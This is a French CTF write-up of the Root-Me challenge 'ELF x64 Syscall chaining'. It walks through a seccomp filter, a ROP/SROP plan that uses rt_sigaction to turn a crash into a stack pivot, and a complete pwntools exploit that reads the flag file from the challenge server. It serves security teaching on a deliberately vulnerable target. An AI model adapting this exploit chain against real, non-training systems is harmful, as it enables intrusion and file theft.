---
layout: post  
title: "ELF x64 Syscall chaining"  
date: 2026-02-10 09:21:40 +0100
categories: CTF
---

Lien du challenge : [https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x64-Syscall-chaining](https://www.root-me.org/fr/Challenges/App-Systeme/ELF-x64-Syscall-chaining)

## On s'installe et on étudie :

```bash
scp -P 2223 app-systeme-ch99@challenge03.root-me.org:ch99 .  
scp -P 2223 app-systeme-ch99@challenge03.root-me.org:libddd.so .  
patchelf --set-rpath . ch99  
```
ch99 n'est pas PIE, full RELRO
Peu de gadgets, pas d'imports, pas de libc, quasi impossible d'utiliser libddd (PIE)
Ca fait peu mais en même temps ca aiguille, surtout avec le nom de l'épreuve.

### Le code se résume à ca :

> 00201000 init()  
> 00201005 sub\_20100f()  
> 0020100a bye()  
> 0020101c return read(&\_\_return\_addr, 0x3e8)

*   La fonction init() utilise seccomp pour interdire ces [syscalls](https://fr.wikipedia.org/wiki/Appel_syst%C3%A8me) (seccomp-tools dump ./ch99) :

> 0003: 0x20 0x00 0x00 0x00000000 A = sys\_number  
> 0004: 0x35 0x0d 0x00 0x40000000 if (A >= 0x40000000) goto 0018  
> 0005: 0x15 0x0c 0x00 0x0000003b if (A == execve) goto 0018  
> 0006: 0x15 0x0b 0x00 0x00000142 if (A == execveat) goto 0018  
> 0007: 0x15 0x0a 0x00 0x00000055 if (A == creat) goto 0018  
> 0008: 0x15 0x09 0x00 0x00000039 if (A == fork) goto 0018  
> 0009: 0x15 0x08 0x00 0x0000003a if (A == vfork) goto 0018  
> 0010: 0x15 0x07 0x00 0x00000057 if (A == unlink) goto 0018  
> 0011: 0x15 0x06 0x00 0x00000058 if (A == symlink) goto 0018  
> 0012: 0x15 0x05 0x00 0x00000127 if (A == preadv) goto 0018  
> 0013: 0x15 0x04 0x00 0x00000127 if (A == preadv) goto 0018  
> 0014: 0x15 0x03 0x00 0x00000136 if (A == process\_vm\_readv) goto 0018  
> 0015: 0x15 0x02 0x00 0x00000137 if (A == process\_vm\_writev) goto 0018  
> 0016: 0x15 0x01 0x00 0x00000086 if (A == uselib) goto 0018

*   La fonction sub\_20100f() fait un read() sur la pile, puis ret ; ca commence comme un [ROP](https://fr.wikipedia.org/wiki/Return-oriented_programming).
*   La fonction bye() fait un syscall exit(). Plutôt définitif.

Les auteurs ont donnés quelques gadgets sympas (rax,rdx..) et un syscall accessible.  
Mais le syscall est "dirty" car il est suivi de code qui déclenche un sigsegv.  
La fonction read() vient de libddd, c'est un wrapper pour le syscall(read) avec l'obligation d'utiliser stdin comme file handle.

### Action :

Impossible de lire le flag ou autre en un seul appel à syscall, il va falloir ruser.
On commence donc par ajouter une gestion du SIGSEGV pour controler le plantage syscall(rt\_sigaction,..).  
Pour faire ca il faut un gadget pour r10, qui manque bien sûr.  
Il faut aussi mettre une structure sigaction quelque part.  
Donc le ROP commencera par réutiliser libddd.read() pour obtenir cette structure et la mettre dans .data.
Le binaire n'est pas PIE, "readelf -S ch99|grep data" donne l'adresse.
Ensuite le ROP peut enchainer sur un syscall, mais le seul gadget qu'on a pour r10 c'est de réutiliser le syscall avec un sigreturn ([SROP](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming)), pour définir d'un coup les registres et retourner sur le syscall.

Ce qui donne les étapes suivantes dans le ROP :

1.  injecter la structure sigaction dans .data
2.  faire un sigreturn pour appeler le syscall avec nos arguments pour le sigaction
3.  faire le sigaction pour gérer le plantage qui suit le syscall

Là le kernel nous redonne la main à l'adresse du handler qu'on a définit dans la structure sigaction.  
Problème ; la pile est remplie de la structure rt\_sigframe, et on ne controle pas les registres.  
Solution ; renvoyer vers la fonction sub\_20100f() qui réecrit la pile et fait un ret.

> 0x000000000020100f: mov rdi, rsp; mov esi, 0x3e8; call 0x2060; ret;

On peut donc envoyer un nouveau ROP depuis le client, comme au début.  
Au final on a transformé le plantage après le syscall en read() et '[stack pivoting](https://ir0nstone.gitbook.io/notes/binexp/stack/stack-pivoting)'.  
Pour simplifier le premier ROP fait : read(), sigreturn, sigaction, crash, handler, read()  
Les suivants feront : sigreturn, syscall(...), crash, handler, read()  
Il faut faire un sigreturn pour signifier que nous ne sommes plus en gestion de signal.  
Sinon on fait un sigsegv dans un sigsegv et le kernel nous tue. C'est dangereux un kernel.

Et là on peut enchainer le open/read/write du fichier flag '.passwd'.  
A distance il fallait donner le chemin complet.. en tatonnant un peu on s'en apercoit vite..

> ➜ ch99 ./exploit.py REMOTE  
> \[+\] Opening connection to challenge03.root-me.org on port 56599: Done  
> \[_\] Loaded 6 cached gadgets for './ch99'_  
> \_\[\_\] ROP 1-2: inject structure sigaction + setup sigaction 
> \[_\] ROP 3: open(".passwd",0)_  
> \_\[\_\] ROP 4: read(3,datarw,100)  
> \[\*\] ROP 5: write(1,datarw,100)  
> b'RM{s1g4ct1on\_f0r\_th3\_w1n!!}\\n.passwd\\x00\\x00\\x00\\x00\\x00\\x0f\\x10 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\`\\x10 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'

```python
from pwn import *
import re
import sys
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./ch99', checksec=False)
elf.address=0x00000000001ff000

if args.REMOTE:
    p = remote('challenge03.root-me.org', 56599)
    # s = ssh(user='app-systeme-ch99', host='challenge03.root-me.org', port=2223, password='app-systeme-ch99')
    # p = s.process('./ch99')
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, gdbscript='''
        break *0x201025
        break read
        handle SIGSEGV pass nostop noprint
        continue
        ''')

datarw=elf.get_section_by_name('.data').header.sh_addr+0xf00 # assez de place pour la rt_stackframe

rop2=ROP(elf)

gadget_syscall=rop2.syscall.address
gadget_ret=0x201024

# Construction du "ROP 2" qui n'en est pas véritablement un
rop2.raw(b'/challenge/app-systeme/ch99/.passwd')
rop2.raw(bytes([0]*(8-len(rop2.chain())%8))) # alignement

offset_struct_sigaction=datarw+len(rop2.chain())
# struct sigaction : handler, flags (SA_RESTORER), restorer, mask
# Le flag SA_RESTORER dira au kernel de rajouter l'adresse de retour après rt_sigframe.
# 0x20100f -> read, pivot
rop2.raw(p64(0x20100f)+p64(0x04000000)+p64(0)+p64(0))  

# construction du ROP 1 : sigreturn -> sigaction -> crash -> (handler,restorer) -> read(stdin,&rsp,&rdx=0x3e8) -> rop3
rop1=ROP(elf)

rop1.read(datarw,0x100)                 # store ROP2

rop1.rax=15                             # sys_sigreturn ; load framesigaction
rop1.raw(gadget_syscall)
framesigaction=SigreturnFrame()
framesigaction.rax=13                   # sys_rt_sigaction
framesigaction.rdi=11                   # SIGSEGV
framesigaction.rsi=offset_struct_sigaction # sigsegv handler
framesigaction.rdx=0                    # NULL
framesigaction.r10=8                    # sigsetsize
framesigaction.rip=gadget_syscall       # chain direct vers syscall encore
framesigaction.rsp=datarw
framesigaction.sigmask=0
rop1.raw(framesigaction)
# pause() # pour strace , pas facile avec GDB après le sigsegv

log.info('ROP 1-2: inject structure sigaction + setup sigaction')
p.send(rop1.chain().ljust(1000, b'\x00')) # on zérote un max la pile, sinon l'argument sigmask est non null et les sigsegv seront bloqués par le kernel.
p.send(rop2.chain())            # pas vraiment un ROP, mais l'objet ROP était pratique
sleep(1)                        # utile en remote

log.info('ROP 3: open(".passwd",0)')
rop3=ROP(elf)
rop3(rax=15)
rop3.raw(gadget_syscall) # reset sigaction + prepare the syscall
framesigopen=SigreturnFrame()
framesigopen.rax=2
framesigopen.rdi=datarw
framesigopen.rsi=0
framesigopen.rip=gadget_syscall
framesigopen.rsp=datarw
rop3.raw(framesigopen)
p.send(rop3.chain())

sleep(1)

log.info('ROP 4: read(3,datarw,100)')
rop4=ROP(elf)
rop4(rax=15)
rop4.raw(gadget_syscall)
framesigread=SigreturnFrame()
framesigread.rax=0
framesigread.rdi=3
framesigread.rsi=datarw
framesigread.rdx=100
framesigread.rip=gadget_syscall
framesigread.rsp=datarw
rop4.raw(framesigread)
p.send(rop4.chain())

sleep(1)

log.info('ROP 5: write(1,datarw,100)')
rop5=ROP(elf)
rop5(rax=15)
rop5.raw(gadget_syscall)
framesigwrite=SigreturnFrame()
framesigwrite.rax=1
framesigwrite.rdi=1
framesigwrite.rsi=datarw
framesigwrite.rdx=100
framesigwrite.rip=gadget_syscall
framesigwrite.rsp=datarw
rop5.raw(framesigwrite)
p.send(rop5.chain())

print(p.clean(timeout=1))
```